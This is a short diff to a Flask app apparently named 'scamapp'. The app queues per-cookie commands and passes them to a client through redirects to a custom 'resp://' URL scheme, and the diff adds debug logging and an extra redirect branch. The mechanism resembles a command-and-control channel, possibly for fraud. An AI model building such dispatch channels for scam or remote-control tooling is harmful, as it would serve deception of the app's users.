@@ -5,6 +5,7 @@ import datetime
 import random
 from functools import wraps
 import secrets
+import logging
 
 app = Flask(__name__)
 BASE_URL = "resp://scamapp/?data="
@@ -79,6 +80,7 @@ def set_cookie_and_redirect():
 
     # Create a response object
     param_value = request.args.get('data', None)
+    logging.warning(param_value)
     data = {'time': datetime.datetime.now()}
     # Do something with the parameter value
     if param_value:
@@ -88,17 +90,20 @@ def set_cookie_and_redirect():
     if 'special_id' in cookies:
         if cookies.get('special_id') in app.config['COMMAND']:
             if app.config['COMMAND'][cookies.get('special_id')] != '':
+                logging.warning(f"jest command {app.config['COMMAND'][cookies.get('special_id')]}")
                 if param_value:
                     command = param_value.split(':')[0]
+                    logging.warning(f"{command}")
                     if app.config['COMMAND'][cookies.get('special_id')] == command:
                         url = BASE_URL + 'success'
                         app.config['COMMAND'][cookies.get('special_id')] = ''
+                else:
+                    url = BASE_URL + app.config['COMMAND'][cookies.get('special_id')]
             else:
                 url = BASE_URL + app.config['COMMAND'][cookies.get('special_id')]
                 app.config['COMMAND'][cookies.get('special_id')] = ''
 
 
-    import logging
     logging.warning(url)
 
     response = make_response(redirect(url))
